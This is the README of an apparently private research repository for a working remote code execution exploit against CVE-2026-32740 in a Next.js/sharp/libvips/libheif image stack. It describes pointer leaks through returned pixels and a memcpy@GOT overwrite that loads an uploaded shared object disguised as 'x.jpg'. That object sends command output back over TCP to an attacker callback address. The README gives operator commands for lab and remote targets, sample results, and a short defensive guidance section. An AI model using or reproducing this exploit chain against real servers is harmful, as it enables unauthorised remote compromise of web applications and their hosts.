# libheif grid-to-GOT Next.js RCE

Working remote proof of concept that turns CVE-2026-32740 in the
version-pinned Next.js/sharp image stack into a chosen-address write and a
validated `/usr/bin/id` callback.

This is a private Fortbridge research repository. Use it only against the
included lab or another system you are explicitly authorised to test.

## What the PoC proves

The exploit uses only the target's HTTP upload and image-optimization routes:

1. It repeatedly submits a donor AVIF and compares pointers in the returned
   pixels with every exact libvips profile in the manifest.
2. It proceeds only when one profile and one randomized libvips base are
   supported by all required independent anchors.
3. It resolves the two-byte fake-node selector using the selected profile. The
   stock profile requires a complete marked heap record. The PIE profile uses
   a verified allocator page-lane invariant and also records a marker-free
   tail record when the response exposes one.
4. It calculates a control target as the recovered libvips base plus the
   profile-verified internal `g_module_open_full` offset.
5. On the attacker machine, it compiles a small shared object whose constructor
   runs the fixed command `/usr/bin/id`. It sends that ELF through the public
   upload route under the image name `x.jpg` and media type `image/jpeg`.
6. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
   plane to `memcpy@GOT - 16`.
7. The first chosen-address row stores `uploads/x.jpg` immediately before the
   GOT slot and replaces `memcpy@GOT` with the derived GModule loader. The next
   row calls that loader with the library path already in RDI.
8. Loading the shared object invokes its constructor, which returns the
   `/usr/bin/id` output over TCP. A per-attempt token prevents a stale callback
   from being counted as success; the returned `uid=...` line is the proof.

No JavaScript or shell script is uploaded. The only non-AVIF upload is the
permitted native library, delivered through the same public image-upload route
under an image filename.

The libvips-relative validation cohort is recorded in
[`evidence/libvips-gmodule-rce-10x.json`](evidence/libvips-gmodule-rce-10x.json).
All ten fresh processes returned valid `/usr/bin/id` output with ten distinct
randomized libvips bases and ten independently derived loader addresses.

The PIE acceptance cohort is recorded in
[`evidence/libvips-gmodule-pie-rce-10x.json`](evidence/libvips-gmodule-pie-rce-10x.json).
All ten fresh `ET_DYN` Node processes returned valid `/usr/bin/id` output. The
cohort observed ten distinct randomized libvips bases. Six responses also
contained the validating PIE tail record; the other four used the same
profile-pinned page-lane invariant without pretending that a record was
present.

## Tested stack

- Node.js 25.8.1, PIE `ET_DYN`
  - build ID `c52fa8d905d7eab79d16c17215f1618f1b8a4429`
  - SHA-256 `4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c`
- Next.js 15.5.23
- sharp 0.34.4
- bundled libvips 8.17.2
- bundled libheif 1.20.2
- Linux x86-64 with ASLR and NX enabled

The PIE cohort uses the exact Node artifact above with ASLR and NX enabled. The
chain does not need the randomized Node base: its control target is the hidden
GModule loader inside libvips, whose randomized base is recovered from returned
pixels. The profile pins that loader's libvips-relative offset and bytes, the
`memcpy` relocation, and the allocator relationships. It contains no absolute
code address and no literal fake-node selector. For the PIE build, the selector
is calculated as the profile's `0x6000` page lane plus the signed `-0x690`
fake-node relation, modulo 16 bits. The marker-free tail record independently
corroborated this calculation in six of ten fresh processes.

The exploit fails closed when a profile is malformed or returned pixels do not
select exactly one supported profile/base pair. The stock profile additionally
requires its complete returned heap record. A profile is an exact compatibility
claim, so the operator should verify the target artifacts offline before using
it.

The loader ABI is important. The overwritten call supplies the library path in
RDI, an image-row pointer in RSI, and the 58-byte copy length in RDX. The pinned
GModule routine uses only supported flag bits from ESI and does not dereference
RDX on the successful load path. An offline harness validated that exact entry
point and instruction signature before it was used in the remote cohort.

## Requirements

- Linux x86-64
- Python 3.11 or later
- `ffmpeg` with the `libaom-av1` encoder
- a C compiler available as `cc` on the attacker machine
- an IPv4 callback address reachable from the target
- Node.js 25.8.1 and npm to run the included lab

Install the only Python dependency:

```bash
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
```

Confirm AV1 encoding support:

```bash
ffmpeg -hide_banner -encoders | grep libaom-av1
```

## Start the included lab

The lab intentionally accepts arbitrary uploads and passes selected files to
sharp. Do not expose it to an untrusted network.

```bash
cd lab
npm ci
npm run build
npm run start
```

The target is then available at `http://127.0.0.1:3000`.

Do not add `LD_PRELOAD`, `MALLOC_ARENA_MAX`, `GLIBC_TUNABLES`,
`VIPS_CONCURRENCY` or `UV_THREADPOOL_SIZE`. The published result uses the
stock process environment and normal sharp worker scheduling.

## Run the exploit

For a local lab, use loopback for both the target and callback:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --json-output result.json
```

The default manifest describes the stock `ET_EXEC` lab. For the verified PIE
artifact, select its separate strict manifest:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --profile-manifest profiles/native_stack_profiles_pie.json
```

For an authorised remote target, `--callback-host` must be an attacker IPv4
address that the target can reach. The listener binds to all local interfaces
by default:

```bash
python3 exploit.py \
  --target https://authorised-target.example \
  --callback-host 203.0.113.10 \
  --callback-port 31337 \
  --json-output result.json
```

A successful result contains:

```json
{
  "success": true,
  "profile_id": "node-25.8.1-pie-sharp-0.34.4-linux-x64",
  "libvips_base": "0x7f1234400000",
  "control_target": {
    "module": "libvips",
    "module_base": "0x7f1234400000",
    "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
    "symbol": "g_module_open_full",
    "exported": false,
    "offset": "0x3e995e",
    "address": "0x7f12347e995e",
    "derivation": "0x7f1234400000 + 0x3e995e = 0x7f12347e995e",
    "abi": "path_rdi_flags_esi_error_rdx",
    "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff"
  },
  "heap_calibration": {
    "derived_selector": "0x5970",
    "selector_source": "profile_page_lane_and_returned_record",
    "profile_candidate_selector": "0x5970",
    "record_candidate_selectors": ["0x5970"],
    "minimum_observations": 1,
    "observations": [
      {
        "response_sha256": "...",
        "candidate_selectors": ["0x5970"],
        "matches": [
          {
            "response_offset": "0xec658",
            "anchor": "0x7f00104f6c30",
            "anchor_page": "0x7f00104f6000",
            "fake_node_delta_from_anchor_page": "-0x690",
            "derived_fake_node": "0x7f00104f5970"
          }
        ]
      }
    ]
  },
  "upload_contract": {
    "calibration_donors": {"content_type": "image/avif"},
    "callback_library": {
      "filename": "x.jpg",
      "remote_path": "uploads/x.jpg",
      "content_type": "image/jpeg"
    },
    "payload": {"content_type": "image/avif"}
  },
  "classification": {
    "selected_attempt": 4,
    "selected_profile_id": "node-25.8.1-pie-sharp-0.34.4-linux-x64",
    "selected_base": "0x7f1234400000",
    "selected_anchors": [
      {"offset": "0x1be1b0", "value": "0x7f12345be1b0", "repetitions": 1},
      {"offset": "0x1c3120", "value": "0x7f12345c3120", "repetitions": 3},
      {"offset": "0x1c3130", "value": "0x7f12345c3130", "repetitions": 3}
    ],
    "rejected_candidates": []
  },
  "callback": {
    "token_matched": true,
    "proof_command": "/usr/bin/id",
    "command_output": "uid=1000(research) gid=1000(research) groups=1000(research)"
  }
}
```

The terminal also prints the result directly:

```text
[RCE] /usr/bin/id -> uid=1000(research) gid=1000(research) groups=1000(research)
```

The optimizer request will usually end with a connection drop and the target
process will normally terminate after the callback. Those events are recorded
for context but are not success conditions.

## Command-line options

```text
--target URL              Target base URL (required)
--callback-host IPV4      Address embedded in the uploaded library (required)
--callback-port PORT      Callback and listener port (default: 31337)
--listen-host IPV4        Local bind address (default: 0.0.0.0)
--leak-attempts N         Maximum donor requests (default: 64)
--callback-timeout SEC    Listener timeout (default: 12)
--trigger-timeout SEC     Optimizer request timeout (default: 20)
--profile-manifest FILE   Profile manifest (default: repository manifest)
--profile ID              Restrict classification to one exact profile
--library-name NAME       Override the image-looking library filename
--remote-upload-dir DIR   Override the profile's upload directory
--json-output FILE        Save the complete result
--concise                 Omit the full JSON result from the terminal
```

The complete library path, including its terminating NUL, must fit the selected
profile's path field. The default `uploads/x.jpg` satisfies the pinned profile's
16-byte constraint. Overrides must retain an image suffix.

## Native-stack profiles

[`profiles/native_stack_profiles.json`](profiles/native_stack_profiles.json)
and
[`profiles/native_stack_profiles_pie.json`](profiles/native_stack_profiles_pie.json)
bind exploit layouts to exact artifacts and ABI measurements. Each profile
identifies Node, Next.js, sharp, libvips, libheif, glibc and libstdc++, then
records the libvips control helper, GOT relocation, returned-pointer anchors,
forged red-black-tree/ImagePlane layout, heap relation, tile geometry and
application paths.

The runtime loader rejects unknown or missing fields, malformed numbers and
digests, unsafe paths, and inconsistent geometry before making an HTTP request.
A profile is a verified compatibility record, not an automatic OS guess.

Each libvips classifier entry declares independent module-relative anchors,
the minimum number of times each anchor must appear, how many distinct anchors
are required, the alpha-channel byte window to scan, the qword stride, and the
expected page alignment. For every returned image, the classifier subtracts
each candidate profile's anchor offsets from the returned qwords. It accepts a
result only when exactly one profile/base pair reaches the declared consensus.

Server, framework, image-geometry, OS, and glibc hints are supporting metadata
only. They are recorded in the result but never identify a binary and never
resolve an ambiguous pointer signature. If evidence is missing, incomplete,
mismatched, unknown, or supports more than one pair, the exploit stops before
compiling or uploading the callback library and before generating, uploading,
or triggering the final AVIF.

The regression suite includes an exact second-build response fixture from
libvips 8.18.4. Its two independent anchors do not cross-match the pinned
libvips 8.17.2 profile; one anchor also has a ten-occurrence threshold to test
that repeated values cannot replace independent anchors.

Successful JSON output records the selecting response attempt, selected
profile and base, each anchor value and repetition count, and every rejected
candidate. It also records each heap response hash, matching response offset,
arena sentinel, heap pointers, libvips references, signed relation and derived
selector. Earlier no-match attempts remain in the `classification.attempts`
array for auditability.

The heap selector has two explicit strategies. The stock profile uses
`response_record`: a candidate must be inside a complete marked record with
the expected chunk size, arena sentinel, paired heap pointers and three
libvips-relative references. The PIE profile uses `profile_page_lane`: the
two-byte selector is calculated from a version-pinned allocator page lane and
the signed page-to-fake-node relation. A returned marker-free tail record can
corroborate that value, but is not reliably present in every process. The
10-process PIE cohort observed it in six lifetimes and still reached RCE in
all ten. The JSON evidence distinguishes `profile_page_lane` from
`profile_page_lane_and_returned_record` so the source is never overstated.

Verify a local stack against every declared identity before using its profile:

```bash
python3 tools/verify_profile_artifacts.py \
  --manifest profiles/native_stack_profiles_pie.json \
  --node /path/to/the/verified/pie/node \
  --libvips lab/node_modules/@img/sharp-libvips-linux-x64/lib/libvips-cpp.so.8.17.2 \
  --libc /usr/lib/x86_64-linux-gnu/libc.so.6 \
  --libstdcxx /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.35 \
  --next-package lab/node_modules/next/package.json \
  --sharp-package lab/node_modules/sharp/package.json \
  --libvips-package lab/node_modules/@img/sharp-libvips-linux-x64/package.json \
  --versions-json lab/node_modules/@img/sharp-libvips-linux-x64/versions.json
```

This offline verifier checks hashes, ELF build IDs and type, Node version, the
libvips `memcpy` jump slot, the control-target bytes, npm package
versions, and bundled libvips/libheif versions. It is deliberately not
imported or run by the remote exploit.

Run the regression suite and fresh-process cohort with:

```bash
python3 -m unittest discover -s tests -v
python3 scripts/fresh_process_cohort.py \
  --node /path/to/the/verified/pie/node \
  --manifest profiles/native_stack_profiles_pie.json \
  --lifetimes 10 \
  --output evidence/libvips-gmodule-pie-rce-10x.json
```

## Repository layout

```text
exploit.py                         remote orchestrator and callback verifier
control_target.py                  libvips base-plus-offset target derivation
profile_classifier.py              pure returned-pixel profile/base classifier
heap_calibrator.py                  repeated returned-pixel heap calibration
rce_payload.py                     proven memcpy-GOT AVIF payload
stack_profile.py                   strict native-stack profile loader
profiles/native_stack_profiles.json exact supported artifact and ABI identity
profiles/native_stack_profiles_pie.json exact PIE artifact and allocator profile
tools/verify_profile_artifacts.py  offline exact-artifact verifier
scripts/fresh_process_cohort.py    fresh-process validation harness
tests/                             strict-loader and exploit regressions
tests/fixtures/                    exact cross-build returned-pixel evidence
avif_grid.py                       lossless AV1 grid/ISO-BMFF generator
callback/callback.c                fixed /usr/bin/id library constructor
payloads/leak-crop-donor-*.avif    returned-pixel information disclosure
lab/                               version-pinned Next.js target
evidence/                          debugger-free validation results
```

`rce_payload.py` contains only the final demonstrated chain. Abandoned BSS,
vtable and rb-tree-GOT experiments were intentionally excluded.

## Scope and limitations

- The target needs an upload path that preserves an image-named shared object
  in a location reachable by the native loader, plus a sharp optimization path
  for AVIF.
- The included lab accepts the ELF as `uploads/x.jpg` with `image/jpeg`. Strong
  magic validation, generated storage names, or storage outside the working
  directory can break the staging step.
- The libvips offset applies only to the exact verified libvips artifact. The
  runtime address is always calculated from remotely returned pointers.
- The low-16-bit plane-map redirection depends on a profile-specific allocator
  page lane and anchor-page-to-fake-node relation. Deployments with different
  native artifacts or allocator layouts require a separately verified profile.
- The PoC proves native execution by returning `/usr/bin/id` output; it does
  not provide an arbitrary command interface or attempt to keep the corrupted
  target process alive.

## Defensive guidance

- Upgrade to a libheif release containing the CVE-2026-32740 fix and rebuild
  every dependent sharp/libvips component.
- Reject or isolate AVIF/HEIF processing until the deployed native dependency
  chain has been verified.
- Validate upload magic, generate server-side names and store uploads outside
  the application working directory on a `noexec` mount.
- Run image decoding in a disposable, least-privileged worker without secrets
  or unrestricted outbound network access.
- Monitor native image workers for crashes, unexpected module loads, or file
  access against upload directories.

## Reproducibility rules

The final evidence was produced without `LD_PRELOAD`, `/proc` address reads,
debugger-derived runtime values, disabled ASLR, allocator tuning, worker-count
changes or target configuration changes. Passive debugging was used during
development only to label fixed binary offsets and was not part of the
delivered exploit.
